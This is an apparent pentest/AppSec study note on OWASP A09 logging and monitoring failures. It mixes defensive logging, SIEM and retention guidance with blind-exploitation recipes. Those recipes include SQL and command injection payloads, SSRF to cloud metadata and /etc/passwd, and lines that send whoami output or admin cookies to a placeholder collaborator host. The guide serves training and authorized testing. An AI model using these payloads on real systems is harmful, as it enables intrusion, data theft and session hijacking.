# A09:2021 - Security Logging and Monitoring Failures

> OWASP Top 10:2021 - A09
> OWASP Top 10:2025 - A09 (unchanged)
>
> Insufficient logging, detection, monitoring, and active response.
> Without logs, breaches go undetected; without monitoring, logs are
> written but never read; without response, alerts are raised but
> never acted on.

---

## Table of Contents

- [1. What Logging Failures Are](#1-what-logging-failures-are)
- [2. Common Logging Failure Classes](#2-common-logging-failure-classes)
- [3. Detection Workflow (Pentest)](#3-detection-workflow-pentest)
- [4. Exploitation Recipes (Pentest)](#4-exploitation-recipes-pentest)
- [5. Pentest via Absence of Logging](#5-pentest-via-absence-of-logging)
- [6. Risk Context (AppSec)](#6-risk-context-appsec)
- [7. Root Causes (AppSec)](#7-root-causes-appsec)
- [8. Preventive Controls (AppSec)](#8-preventive-controls-appsec)
- [9. Detection Controls (AppSec)](#9-detection-controls-appsec)
- [10. Verification (AppSec)](#10-verification-appsec)
- [11. OSCP Notes](#11-oscp-notes)
- [12. Production Notes](#12-production-notes)
- [13. References](#13-references)

---

## 1. What Logging Failures Are

Logging failures are not a vulnerability in the traditional sense.
Nothing is exploitable because of a log entry that was not written.
Instead, logging failures are a **detection gap**: an attacker can
operate, escalate, and persist without being seen, because the
evidence either was not recorded or was not acted on.

**The chain:**

1. **Logging** - the event is recorded (or not).
2. **Monitoring** - the log is reviewed or correlated (or not).
3. **Detection** - a signal is produced (or not).
4. **Response** - a human acts on the signal (or not).

A failure at any point breaks the chain. The most common failures
are at steps 1 (no log) and 4 (no response).

**Why this matters for a pentester:**

- The absence of logging is itself a finding. If you can perform a
  full attack chain without triggering a single alert, the report
  should say so.
- Blind vulnerabilities (blind SQLi, blind SSRF, time-based command
  injection) are exploited precisely because the application does
  not reveal results. The pentester works around missing feedback.
- The same techniques are relevant to both pentest and blue-team
  work: the pentester finds the gap; the defender closes it.

**Why this matters for AppSec:**

- A breach without detection can persist for months. The average
  time-to-detect for a data breach is measured in weeks or months,
  not hours.
- Logging is the input to incident response. Without logs, there is
  no timeline, no scope, no root cause.
- Compliance frameworks (PCI DSS, HIPAA, SOC 2, ISO 27001) require
  logging and monitoring. A gap is both a security and a compliance
  issue.

---

## 2. Common Logging Failure Classes

The failures fall into a small number of classes. Each class has a
different root cause and a different fix.

### 2.1 No Logging at All

The application does not write logs for security-relevant events.

**Examples:**

- Authentication attempts (success and failure) are not logged.
- Authorization decisions (allow / deny) are not logged.
- Admin actions (user creation, permission change) are not logged.
- Input validation failures are not logged.
- Password changes and MFA enrollment are not logged.

**Symptom:** during an incident, you have no way to know what
happened, when, or by whom.

### 2.2 Insufficient Logging

Some events are logged, but the important ones are not. The log
exists; it just does not answer the questions you will ask during
an incident.

**Examples:**

- Login failures are logged, but successes are not.
- Failed authorization is logged, but successful privileged actions
  are not.
- The HTTP request is logged, but not the authenticated user.
- The API call is logged, but not the parameters (so you cannot
  tell what was changed).

### 2.3 Logs Written but Not Monitored

The logs exist. No one reads them. No alert is configured. The
evidence is on disk, but the detection never happens.

**Examples:**

- Logs are collected but only reviewed during an incident.
- No SIEM, no correlation, no alerting rules.
- Alerts exist but go to an unmonitored mailbox.
- Alert volume is so high that real signals are lost in noise.

### 2.4 Logs Not Retained

The logs are written and monitored, but rotated out too quickly.
By the time the incident is discovered, the relevant logs are gone.

**Examples:**

- 7-day retention for an intrusion that started 30 days ago.
- Log rotation that overwrites before archiving.
- No central collection: local logs are lost when the host is
  rebuilt.
- Retention policy not aligned with the threat model or compliance
  requirements.

### 2.5 Logs Without Context

The log entry exists but does not contain enough information to be
useful.

**Examples:**

- `Login failed` - for which user? from which IP? at what time?
- `Error 500` - on which endpoint? with which request ID?
- `Permission denied` - for which resource? which role?
- A single log line with no correlation ID linking it to related
  events.

**Best practice:** structured logs (JSON) with consistent fields:

- `timestamp` (ISO 8601, UTC).
- `event_type` (auth.login, authz.deny, admin.user.create).
- `actor` (user ID, session ID, IP, user agent).
- `target` (resource ID, endpoint).
- `result` (allow / deny / success / failure).
- `correlation_id` (ties related events together).

### 2.6 Sensitive Data in Logs

The inverse failure: too much logged. Passwords, tokens, PII, and
credit card numbers end up in log files, where they can be read by
operations staff, leaked through log aggregation, or exposed in
incident reports.

**Examples:**

- Full request body logged (including password fields).
- Session tokens or API keys logged in URLs.
- Credit card numbers, SSNs, or health data in log lines.
- Stack traces with environment variables.

**Design rule:** log the **event**, not the **payload**. Log that a
login was attempted with user X, not the password that was tried.

### 2.7 Logs Easy to Tamper With

The attacker can modify or delete logs to cover their tracks.

**Examples:**

- Application writes logs to a world-writable file.
- Logs are stored on the same host the attacker has compromised.
- No append-only storage, no signing, no central collection.
- Log rotation script is writable by the application user.

---

---

## 3. Detection Workflow (Pentest)

The pentest angle of A09 is unusual: you are not looking for a
vulnerability, you are looking for the **absence of a control**. The
question is not "can I exploit this?" but "if I exploit something,
will anyone notice?"

### 3.1 Blind Vulnerability Testing

Many vulnerabilities are blind: the response does not contain the
result of the exploit. The attacker must infer success from
indirect signals.

**Blind classes:**

- **Blind SQL injection:** the query executes, but the result is not
  reflected. Infer from time delay or boolean response difference.
- **Blind SSRF:** the server makes the request, but the response is
  not returned. Infer from out-of-band callbacks.
- **Blind command injection:** the command runs, but output is not
  returned. Infer from time delay or OOB.
- **Blind XSS:** the payload executes in an admin browser, not in
  yours. Infer from a callback to your listener.

### 3.2 Time-Based Detection

The most portable blind technique. Inject a payload that causes a
delay only if the condition is true.

**Example (MySQL time-based SQLi, assume the input is inside a single-quoted string):**

```sql
'' OR IF(SUBSTRING(database(),1,1)=CHAR(97), SLEEP(5), 0)-- -
```

In the payload above, `''` stands for two literal single quotes
(the closing quote of the surrounding SQL string, followed by an
opening quote for the injected expression). `CHAR(97)` is the ASCII
code for `a` - used here to avoid embedding a quoted character in
the example. If the response takes 5 seconds, the condition was
true. Iterate character by character to extract data.

**Example (time-based command injection):**

```bash
; sleep 5 #
| ping -c 5 127.0.0.1
`sleep 5`
$(sleep 5)
```

In the payload above, the backtick character appears literally, and
the dollar sign appears literally. Both are used to wrap the shell
command in a subshell so it executes regardless of the surrounding
context.

### 3.3 Out-of-Band (OOB) Detection

More reliable than time-based when the network allows it. The target
makes a request to a listener you control.

**Tools:**

- **Burp Collaborator** - built into Burp Suite Pro.
- **interactsh** - open source, self-hostable
  (https://github.com/projectdiscovery/interactsh).
- **Canarytokens** - simple HTTP/DNS tokens from Thinkst.
- **A public VPS with tcpdump / nc** - the manual option.

**Example (blind SSRF):**

```text
http://target/fetch?url=http://<collaborator>/x
```

If the collaborator receives a request, the SSRF is confirmed.

### 3.4 Boolean-Based Detection

The response differs in a small, controllable way depending on the
condition. Common with blind SQLi and blind IDOR.

**Example (boolean SQLi, same assumption as 3.2):**

```sql
'' AND 1=1-- -    (returns normal page)
'' AND 1=2-- -    (returns empty page or error)
```

The difference (content length, status code, timing) is the signal.

### 3.5 Detecting the Absence of Logging

There is no direct way to test "is this action logged?". The
pentester can only observe **consequences**:

- **No rate limiting after many failed logins** - suggests no
  monitoring on login failures.
- **No lockout, no CAPTCHA, no alert** - suggests no detection
  rules.
- **A full attack chain completes without interruption** - the
  absence of response is itself the finding.

In the report, this is written as: *"During the engagement, the
assessment team performed [actions]. No evidence of detection or
response was observed. This indicates a gap in logging, monitoring,
or alerting."*

---

## 4. Exploitation Recipes (Pentest)

These are the techniques that blind exploitation relies on. They are
not vulnerabilities in the app - they are the workarounds the
pentester uses when the app provides no feedback.

### 4.1 Time-Based Blind SQLi

**Scenario:** a login form returns the same generic error whether
the SQL fails or succeeds. No output is reflected.

**Recipe:**

1. Confirm the injection point with a benign payload (assume the
   input is inside a single-quoted string; `''` = two quotes):

```sql
'' OR 1=1-- -
```

2. Confirm time-based behavior:

```sql
'' OR SLEEP(5)-- -
```

3. Extract data character by character:

```sql
'' OR IF(SUBSTRING((SELECT database()),1,1)=CHAR(97), SLEEP(5), 0)-- -
```

4. Automate with `sqlmap --technique=T` (time-based only).

### 4.2 Blind SSRF with OOB

**Scenario:** a webhook URL or image-fetch parameter. The server
makes the request, but the response is not visible.

**Recipe:**

1. Start an interactsh listener:

```bash
interactsh-client
```

2. Send the payload:

```text
POST /api/webhook

url=http://<interactsh-id>.oast.fun/test
```

3. Watch the interactsh client for a DNS or HTTP callback.

4. If confirmed, escalate:

```text
url=http://169.254.169.254/latest/meta-data/
url=http://127.0.0.1:8080/admin
url=file:///etc/passwd
```

### 4.3 Blind Command Injection via Time

**Scenario:** a form field is passed to a shell command. Output is
not returned.

**Recipe:**

1. Baseline: measure the response time of the normal request.
2. Test with a delay payload:

```bash
127.0.0.1; sleep 5
127.0.0.1 && sleep 5
127.0.0.1 | sleep 5
`sleep 5`
$(sleep 5)
```

3. If the response takes 5 seconds more than baseline, the command
   executed.

4. Escalate to OOB for reliable exfiltration:

```bash
127.0.0.1; curl http://<collaborator>/$(whoami)
```

### 4.4 Blind XSS

**Scenario:** your input is stored and later rendered in an admin
panel you cannot see.

**Recipe:**

1. Use a blind XSS payload with an OOB callback:

```html
<script src="//<collaborator>/x"></script>
"><script>new Image().src="//<collaborator>/"+document.cookie</script>
```

2. Submit the payload through every input field (contact form,
   profile, comment, support ticket).

3. Wait. When the admin views the page, the callback fires with the
   admin session cookie.

4. Use the cookie to hijack the admin session.

**Tools:** XSStrike, XSS Hunter, Burp Collaborator.

### 4.5 Blind IDOR via Timing or Content Length

**Scenario:** an API returns 404 for nonexistent resources and 403
for existing-but-unauthorized resources. The distinction leaks
existence.

**Recipe:**

1. Send requests for a range of IDs.
2. Compare status codes (404 vs 403), response length, and response
   time.
3. Enumerate existing IDs even without reading their content.

---

## 5. Pentest via Absence of Logging

> [!CAUTION]
> This section is scoped strictly to **authorized penetration
> testing and red team engagements**. It describes what the absence
> of logging means for the assessment and how to report it. It is
> not a guide to evading detection in unauthorized activity. Every
> technique below assumes written authorization and a defined scope.

When logging is absent or weak, the pentester's job changes. The
finding is not "I accessed X" - it is "I accessed X, and nothing
was recorded or alerted".

### 5.1 What Absence of Logging Enables

- **Longer dwell time.** Without alerts, the assessment can continue
  across sessions without triggering response.
- **Broader scope.** If nothing is monitored, the full attack chain
  can be exercised - not just the initial foothold.
- **Realistic adversary simulation.** A red team engagement is
  useful only if the defender has a chance to detect. If there is
  no detection, the engagement measures nothing.

### 5.2 What to Report

The report should document:

1. **Actions performed** that should have been logged (login
   attempts, privilege changes, data access).
2. **Evidence of monitoring** - or lack thereof - observed during
   the engagement.
3. **Time to detect** - if the defender noticed anything, how long
   did it take?
4. **Recommendations** - specific log sources to add, specific
   alerts to configure, specific retention to extend.

### 5.3 What NOT to Do

- Do NOT modify or delete logs, even if you can. If logs are
  writable, that is a finding - take a screenshot, do not erase.
- Do NOT disable logging or monitoring as part of the test unless
  the scope explicitly allows it.
- Do NOT use absence of logging as justification to expand scope.
- Do NOT use the techniques in this file to evade detection in any
  activity outside a written engagement.

### 5.4 The Finding Statement

A well-written finding for this category looks like:

> During the assessment, the team performed [N failed login
> attempts from IP X over M minutes] against the authentication
> endpoint. No account lockout, no CAPTCHA, no alert to the
> operations team was observed. The same pattern continued for
> [duration]. This indicates that authentication failures are
> either not logged, not monitored, or not alerted on. Recommended
> remediation: log all authentication attempts with actor, source
> IP, timestamp, and result; configure an alert when the failure
> rate exceeds [threshold] within [window]; retain logs for at
> least [period].

---

## 6. Risk Context (AppSec)

**Why this is a top-10 category.** Logging failures do not cause
breaches. They cause breaches to last for months instead of hours.
The category is ranked A09 because the impact is measured in
dwell time and blast radius, not in direct exploitability.

**Real-world pattern.** The typical detection failure looks like
this:

1. An attacker gains a foothold through a routine vulnerability
   (phishing, unpatched service, weak credential).
2. The attacker enumerates, escalates, and moves laterally. Each
   step generates log entries on some system.
3. The log entries are written, but not correlated, not alerted on,
   and not reviewed.
4. The breach is discovered months later by an external party -
   a customer, a researcher, or law enforcement.
5. The incident response team reconstructs the timeline from logs
   that were retained. If retention was short, the timeline has
   gaps.

**Well-known cases (for context):**

- **Target (2013).** FireEye and other monitoring tools generated
  alerts. The alerts were not acted on. The breach affected 40M
  payment cards.
- **Equifax (2017).** A vulnerable Apache Struts component was
  exploited. The breach lasted 76 days before detection. Affected
  147M people.
- **SolarWinds (2020).** The supply chain compromise was detected by
  a third party (FireEye), not by the victim's monitoring.
- **Colonial Pipeline (2021).** The ransomware was detected quickly,
  but the response was delayed by the need to manually assess the
  scope - because logging was incomplete.

In each case, the vulnerability is not the story. The detection gap
is.

**Why scanners miss it.** DAST and SAST tools do not check whether
events are logged. Logging is invisible to a scanner: there is no
payload that proves a log entry exists.

**AppSec relevance.** Logging and monitoring are the foundation of
incident response and compliance. They are also the control most
often deferred, because their value is only realized during an
incident - which the team hopes never happens.

---

## 7. Root Causes (AppSec)

**1. Logging is not in the requirements.** The functional spec says
"users can log in". It does not say "all authentication attempts
are logged with actor, source, timestamp, and result". Without the
requirement, no one builds it.

**2. Logging is treated as a developer convenience.** Logs are added
for debugging, not for security. They contain the information the
developer needed, not the information an incident responder needs.

**3. No central collection.** Logs are written locally on each host.
When the host is rebuilt, the logs are gone. When the incident
spans multiple hosts, the timeline is fragmented.

**4. No monitoring.** Logs are written but never read. The SIEM
either does not exist, or exists with no useful rules, or exists
with rules that generate more noise than signal.

**5. Retention is too short.** Storage is expensive. Logs are
rotated aggressively. By the time the breach is discovered, the
evidence has been overwritten.

**6. No ownership.** Nobody owns "logging" as a domain. Developers
own the code, ops own the infrastructure, security owns the
alerts - but no one owns the question "do we have the logs we
need, and are they being read?".

**7. Alert fatigue.** The SIEM generates thousands of alerts per
day. The operations team stops looking. Real signals are lost in
noise.

**8. No feedback loop from incidents.** Post-mortems identify
missing logs. The finding is noted but not turned into a
requirement or a monitoring rule. The next incident has the same
gap.

---

## 8. Preventive Controls (AppSec)

**What to log (the minimum set):**

- **Authentication:** every login attempt (success and failure)
  with actor, source IP, timestamp, user agent, result.
- **Authorization:** every deny decision (and, for privileged
  actions, every allow decision) with actor, resource, action,
  result.
- **Session lifecycle:** session creation, refresh, and destruction,
  with session ID and actor.
- **Account lifecycle:** user creation, deletion, role change,
  password change, MFA enrollment.
- **Admin actions:** configuration changes, permission changes,
  data exports.
- **Input validation failures:** rejected input, especially on
  security-relevant endpoints.
- **Errors:** application errors with enough context to correlate
  (request ID, endpoint, actor).

**What NOT to log:**

- Passwords, even hashed.
- Session tokens, API keys, JWTs.
- Credit card numbers, SSNs, PII.
- Full request bodies if they may contain the above.

**Format:**

Structured logs (JSON) with consistent fields. Every event has:

- `timestamp` (ISO 8601, UTC).
- `event_type` (hierarchical: `auth.login.success`).
- `actor` (user ID, session ID, IP, user agent).
- `target` (resource ID, endpoint).
- `result` (allow / deny / success / failure).
- `correlation_id` (ties related events together).

**Central collection:**

All logs are shipped to a central store (SIEM, log aggregator) in
near real-time. Local logs are a fallback, not the primary source.
Central collection protects against host compromise and makes
cross-host correlation possible.

**Retention:**

Retention is aligned with the threat model and compliance
requirements. Common minimums:

- 30 days for active investigation.
- 90 days for initial response.
- 1 year for compliance (PCI DSS, HIPAA, SOC 2 differ).
- Longer for regulated data.

**Integrity:**

- Append-only storage where possible.
- Central collection prevents local tampering.
- For high-value logs, consider signing or a write-once store.
- Access to logs is itself logged.

---

## 9. Detection Controls (AppSec)

Prevention ensures logs exist. Detection ensures they are read.

**SIEM and correlation.** A SIEM aggregates logs from multiple
sources and applies correlation rules. Example rules:

- **Brute force:** more than N failed logins for the same user
  from the same IP within M minutes.
- **Password spraying:** failed logins for many users from one IP
  within a short window.
- **Impossible travel:** successful logins for the same user from
  geographically distant IPs within an implausible time window.
- **Privilege change:** new admin role granted outside a change
  window.
- **Data exfiltration:** large data export from a single user
  within a short window.
- **Sensitive endpoint access:** access to `/admin`, `/api/export`,
  or similar from an unusual IP or user.

**Alerting thresholds.** Tune to avoid alert fatigue. Start with a
small set of high-signal rules and expand as the team's response
capacity grows.

**Alert routing.** Alerts go to a monitored channel - not to a
shared mailbox that no one owns. High-severity alerts page a human.

**Runbooks.** Each alert has a documented response: what to check,
what to do, who to notify. Without a runbook, alerts are noise.

**Metrics.** Track: mean time to detect (MTTD), mean time to
respond (MTTR), alert volume, false-positive rate. These metrics
drive tuning.

---

## 10. Verification (AppSec)

**Test that events are logged.** For each event in the minimum set,
generate the event and verify the log entry appears in the central
store within the expected latency.

**Test that alerts fire.** For each alerting rule, generate the
trigger condition and verify the alert is delivered to the expected
channel.

**Test retention.** Write a log entry, wait for the retention
window, verify the entry is still present. This is a slow test -
do it once per policy change.

**Test integrity.** Attempt to modify or delete a log entry from a
non-privileged account. Verify the attempt fails and is itself
logged.

**Tabletop exercises.** Walk through a hypothetical incident with
the response team. Ask: what logs would we look at first? Do we
have them? Can we correlate them? This surfaces gaps that tests
miss.

**ASVS mapping.** Relevant ASVS 4.0.3 chapters: V7 (Error Handling
and Logging), V1.14 (Secure Build and Deployment, for log
pipeline), V10 (Malicious Code, for log integrity).

**OWASP resources for verification:**

- OWASP ASVS: https://owasp.org/www-project-application-security-verification-standard/
- OWASP Cheat Sheet - Logging: https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html
- OWASP Cheat Sheet - Logging Vocabulary: https://cheatsheetseries.owasp.org/cheatsheets/Logging_Vocabulary_Cheat_Sheet.html
- OWASP WSTG - Testing for Logging: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/

---

## 11. OSCP Notes

> [!IMPORTANT]
> OSCP report: for blind vulnerabilities, screenshot the timing or
> OOB callback that proves the exploit worked. The absence of
> visible output is the vulnerability; the callback is the proof.

Key patterns for OSCP:

- Blind SQLi, blind SSRF, and blind command injection are common on
  OSCP-like boxes. They require the same OOB/timing toolkit
  (interactsh, Burp Collaborator, sleep payloads).
- If an exploit produces no visible result, try time-based or OOB
  variants before giving up.
- The absence of application logs is not testable from outside.
  Report it only if the engagement scope includes defensive review.
- On OSCP exam machines, logging is rarely the vulnerability. Focus
  on the blind-exploit techniques, which are commonly tested.

---

## 12. Production Notes

- **Logging is a requirement, not a feature.** Put it in the spec
  next to the functional requirement.
- **Log the event, not the payload.** Never log passwords, tokens,
  or PII. Log that the event happened, with the actor and result.
- **Central collection from day one.** Local logs die with the
  host. Ship them.
- **One owner for logging.** Someone must own "do we have the logs,
  and are they read?". Without ownership, gaps persist.
- **Retention aligned with the threat model.** 7 days is not
  enough. 90 days is a reasonable starting point.
- **Test alerts, not just logs.** A log entry that no one reads is
  not a control. Test the full path: event -> log -> SIEM -> alert
  -> human.
- **Runbooks for every alert.** An alert without a runbook is
  noise.
- **Learn from incidents.** Every post-mortem should end with a
  concrete change to logging or alerting.

---

## 13. References

**OWASP:**

- OWASP Top 10:2021 - A09 - https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/
- OWASP Top 10:2025 - A09 (unchanged) - https://owasp.org/Top10/2025/
- OWASP ASVS - https://owasp.org/www-project-application-security-verification-standard/
- OWASP Cheat Sheet - Logging - https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html
- OWASP Cheat Sheet - Logging Vocabulary - https://cheatsheetseries.owasp.org/cheatsheets/Logging_Vocabulary_Cheat_Sheet.html
- OWASP Cheat Sheet - Application Logging Vocabulary - https://cheatsheetseries.owasp.org/cheatsheets/Application_Logging_Vocabulary_Cheat_Sheet.html

**Standards and frameworks:**

- NIST SP 800-92 - Guide to Computer Security Log Management.
- NIST SP 800-61 - Computer Security Incident Handling Guide.
- SIGMA - generic signature format for SIEM rules - https://github.com/SigmaHQ/sigma
- MITRE ATT&CK - adversary tactics and techniques (useful for
  detection mapping): https://attack.mitre.org/

**Blind-exploitation tools referenced in this file:**

- interactsh - https://github.com/projectdiscovery/interactsh
- Burp Collaborator: built into Burp Suite Professional.
- Canarytokens - https://canarytokens.org/

**Internal cross-references:**

- [A01 - Broken Access Control](./A01-Broken-Access-Control.md)
- [A04 - Insecure Design](./A04-Insecure-Design.md)
- [A06 - Vulnerable Components](./A06-Vulnerable-Components.md)
- [2021-vs-2025.md](./2021-vs-2025.md)
- [README.md](./README.md)
- [08 Vulnerabilities/SSRF.md](../08%20Vulnerabilities/SSRF.md)
- [08 Vulnerabilities/SQLi.md](../08%20Vulnerabilities/SQLi.md)
- [08 Vulnerabilities/Command-Injection.md](../08%20Vulnerabilities/Command-Injection.md)

---

*File version: 2026-10-13 (pass 73, W3.4).*
